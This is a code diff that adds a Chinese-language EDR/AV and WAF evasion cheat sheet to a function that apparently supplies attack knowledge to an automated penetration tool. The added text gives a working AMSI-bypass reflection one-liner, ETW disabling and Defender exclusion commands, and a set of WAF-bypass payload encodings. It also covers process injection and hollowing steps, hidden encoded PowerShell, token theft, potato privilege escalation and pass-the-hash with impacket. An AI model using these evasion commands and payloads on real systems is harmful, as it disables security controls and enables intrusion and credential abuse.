@@ -660,6 +660,40 @@ export function getAttackKnowledgeSection(): string {
 
 ---
 
+## 十三点五、EDR/AV 绕过技术
+
+### 检测规避基础
+1. **识别防护**: 先用BypassDetector检测WAF/EDR/沙箱类型
+2. **针对性绕过**: 根据检测结果选择对应绕过技术
+3. **分阶段测试**: 从最简单的绕过方法开始测试，逐步升级
+
+### PowerShell AMSI 绕过速查
+- **反射补丁**: \`\`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\`\`
+- **字符串混淆**: 拆分类名和字段名避免静态检测 — \`\`[char]116\`\` 替代 \`\`t\`\`
+- **环境变量**: \`\`$env:COMPLUS_ETWEnabled=0\`\`
+- **Defender排除**: \`\`Add-MpPreference -ExclusionPath "C:\\temp"\`\`（需管理员）
+
+### WAF 绕过速查
+- **分块传输编码**: \`\`Transfer-Encoding: chunked\`\` — 将payload分块发送
+- **HTTP参数污染**: \`\`?id=1&id=2\`\` — 后端通常取最后一个值
+- **Unicode编码**: \`\`%u0061%u0064%u006d%u0069%u006e\`\` 替代 \`\`admin\`\`
+- **SQL注释插入**: \`\`ad'min'\`\` / \`\`ad/**/min\`\` / \`\`SELECT/**/*\`\`
+- **大小写变换**: \`\`SeLeCt\`\` / \`\`sElEcT\`\` 替代 \`\`SELECT\`\`
+- **双重URL编码**: \`\`%2527\`\` 替代 \`\`'\`\`（某些WAF只解码一层）
+
+### 进程注入速查
+- **CreateRemoteThread**: 经典方法 — OpenProcess→VirtualAllocEx→WriteProcessMemory→CreateRemoteThread
+- **DLL注入**: 编写含payload的DLL → LoadLibraryA注入到目标进程
+- **无文件PowerShell**: \`\`powershell -nop -w hidden -enc <base64>\`\`
+- **进程空洞化**: 创建挂起的合法进程(svchost/notepad) → 取消映射 → 写入恶意映像 → 恢复线程
+
+### Token 操作速查
+- **令牌窃取**: 获取SYSTEM进程token → DuplicateToken → ImpersonateLoggedOnUser
+- **SeImpersonatePrivilege**: JuicyPotato/PrintSpoofer/RoguePotato — 利用COM对象模拟认证
+- **Pass-the-Hash**: impacket-psexec/wmiexec -hashes :NTLM_HASH
+
+---
+
 ## 十四、攻击链组合公式 (Attack Chain Recipes)
 
 ### 链 1：信息泄露 → 凭证 → Shell
